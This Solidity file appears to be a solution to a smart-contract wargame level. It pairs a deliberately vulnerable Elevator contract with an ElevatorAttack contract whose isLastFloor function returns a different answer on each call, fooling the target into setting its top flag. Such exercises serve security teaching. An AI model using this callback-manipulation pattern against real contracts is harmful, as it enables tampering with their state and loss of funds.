// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract ElevatorAttack is Building {
    Elevator public elevator;
    bool public lastFloorFlag = true;
    
    constructor(Elevator _elevator) public {
        elevator = _elevator;
    }
    
    function attack() public {
        lastFloorFlag = true;
        goTo();
    }
    
    function isLastFloor(uint) external override returns (bool) {
        lastFloorFlag = !lastFloorFlag;
        return lastFloorFlag;
    }
    
    function goTo() private {
        elevator.goTo(1);
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}